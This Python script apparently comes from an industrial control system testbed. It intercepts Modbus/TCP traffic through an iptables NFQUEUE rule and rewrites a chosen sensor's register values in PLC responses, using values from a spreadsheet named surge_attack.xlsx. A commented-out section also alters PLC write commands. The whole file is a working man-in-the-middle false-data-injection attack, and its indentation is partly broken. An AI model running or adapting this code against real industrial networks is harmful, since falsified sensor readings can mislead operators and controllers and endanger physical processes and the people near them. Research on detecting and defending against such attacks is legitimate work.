from netfilterqueue import NetfilterQueue
import os
from scapy.all import *
from scapy.contrib.modbus import *
import struct
import math
from openpyxl import *
import random

def dec_to_float(high_sensor_value,low_sensor_value):

    high_sensor_value = hex(high_sensor_value)[2:].zfill(4)
    low_sensor_value = hex(low_sensor_value)[2:].zfill(4)
    sensor_value = high_sensor_value + low_sensor_value
    float_sensor_value = struct.unpack("!f",sensor_value.decode("hex"))[0]
    hex_sensor_value = struct.pack(">f",float_sensor_value).encode("hex").zfill(8)
    return hex_sensor_value,float_sensor_value

def float_to_dec(hex_sensor_value):
    high_reg = hex_sensor_value[:4]
    high_reg = int(high_reg,16)
    low_reg = hex_sensor_value[4:]
    low_reg = int(low_reg,16)
    return high_reg,low_reg

def print_sensor_values(sensors_value):
    for i in range(len(sensors_value)): #big_endian
        if(i%2==1):
            continue
        high_sensor_value = sensors_value[i]
        low_sensor_value = sensors_value[i+1]
        hex_sensor_value,sensor_value = dec_to_float(high_sensor_value,low_sensor_value)
        print "sensor",str(i/2),"\t",hex_sensor_value,"\t","%g"%sensor_value

def Attacks(sime_time,sensor_index):
    t = sime_time
    t = float(t) * 10000
    t = int(t)
    step = t / 5
    time_index = int(2 + step * 42)
    sensor_index = int(sensor_index) - 1
    index = time_index + sensor_index
    out_put_value = float(sheet["C" + str(index)].value)
    hex_value = struct.pack(">f", out_put_value).encode("hex")
    #print(hex_value)
    hex_value = hex_value.zfill(8)
    high_reg,low_reg = float_to_dec(hex_value)
    return high_reg,low_reg


def print_float_sensor(value):
    float_te_value = []
    for i in range(0,len(value),2):
        high_reg = value[i]
        low_reg = value[i+1]
        float_te_sensor  = dec_to_float(high_reg,low_reg)[1]
        float_te_sensor = "%g"%float_te_sensor
        float_te_value.append(float_te_sensor)
    return float_te_value

sim_time_set = []
sim_plc_set = []
def print_and_accept(pkt):
    global sim_time_set
    global sim_plc_set
    pkt1 = IP(pkt.get_payload())
    try:
        if(pkt1["IP"].src=="192.168.1.106" or pkt1["IP"].src=="192.168.1.107"):    
            if(pkt1["TCP"].dport!=1502):
                pkt.accept()
                return
    except:
        
        pkt.accept()
        return
    #print pkt1.show()
    #pkt.accept()
    if(pkt1["IP"].src =="192.168.1.101" or pkt1["IP"].src == "192.168.1.102" or pkt1["IP"].src =="192.168.1.106" or pkt1["IP"].src == "192.168.1.107"):
        pass
    else:
        pkt.drop()
        return
    """
    if len(pkt1)>277:
        pkt.drop
        return
    """
    if len(pkt1)==277:
        try:
            if(pkt1["ModbusADUResponse"].funcCode==3):
                pass
        except:
            pkt.drop()
    del pkt1["IP"].chksum
    del pkt1["TCP"].chksum
    try:
        #---------------------------attack plc-----------------------------------
        """
        if(pkt1["ModbusADURequest"].funcCode == 16):
            
            refer_addr = pkt1["ModbusADURequest"].startingAddr
            #print refer_addr
            if(len(sim_plc_set)==12):
                sim_plc_set=[]
            if refer_addr in sim_plc_set:
	        pkt.drop()				   	
	        return	
            sim_plc_set.append(refer_addr)
            
            value= pkt1["ModbusADURequest"].outputsValue
	    high_sim_time = value[0]
            low_sim_time = value[1]
            sim_time = round(dec_to_float(high_sim_time,low_sim_time)[1],4)
            out_put_value = float(sim_time)+random.randint(1,10)
            hex_value = struct.pack(">f", out_put_value).encode("hex")
            hex_value = hex_value.zfill(8)
            high_reg, low_reg = float_to_dec(hex_value)
            pkt1["ModbusADURequest"].outputsValue[0] = high_reg
            pkt1["ModbusADURequest"].outputsValue[1] = low_reg
            modify_value= pkt1["ModbusADURequest"].outputsValue
	    high_sim_time = modify_value[0]
            low_sim_time = modify_value[1]
            sim_time = round(dec_to_float(high_sim_time,low_sim_time)[1],4)
            print "*****after modify",sim_time
            pkt.set_payload(str(pkt1))	
            pkt.accept()
            return    
        """
        #---------------------------attack plc-----------------------------------



        #---------------------------attack te-----------------------------------
        if(pkt1["ModbusADUResponse"].funcCode == 3):
            value= pkt1["ModbusADUResponse"].registerVal	    
            if len(value)!=108:
                pkt.drop()
                return
            high_sim_time = value[0]
            #print high_sim_time
            low_sim_time = value[1]
            #print low_sim_time
            sim_time = round(dec_to_float(high_sim_time,low_sim_time)[1],4)
            #print value
            #print len(value)
            if sim_time in sim_time_set:
	        pkt.drop()				   	
	        return	
            sim_time_set.append(sim_time)
            #print sim_time_set
            value = print_float_sensor(value)
            if(pkt1["IP"].src=="192.168.1.102"):
                pkt.accept()
                return
            print("---------------------------------")	
            print sim_time
            print "*"*10+"before modify :",value
			
			sensor_index = 7 # attack target sensor
            
            high_sensor_value,low_sensor_value  = Attacks(sim_time,sensor_index)
            pkt1["ModbusADUResponse"].registerVal[sensor_index*2] = high_sensor_value
            pkt1["ModbusADUResponse"].registerVal[sensor_index*2+1] = low_sensor_value
            modify_value = pkt1["ModbusADUResponse"].registerVal
            modify_value =  print_float_sensor(modify_value)
	    print "*"*10+"after modify :",modify_value
            pkt.set_payload(str(pkt1))
            pkt.accept()
            return
        #---------------------------attack te-----------------------------------
    except:
        pkt.accept()
        pass

if __name__ == '__main__':
    wb = load_workbook("surge_attack.xlsx") # load attack type
    sheet = wb["test"]
    iptables_rule = 'iptables -A FORWARD -d 192.168.1.0/24  -m u32 --u32 "0&0xFFFF=0x44:0xEA00" -j NFQUEUE --queue-num 1'
    os.system(iptables_rule)
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, print_and_accept)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('')
        nfqueue.unbind()
        os.system("iptables -F")
    nfqueue.unbind()
    os.system("iptables -F")
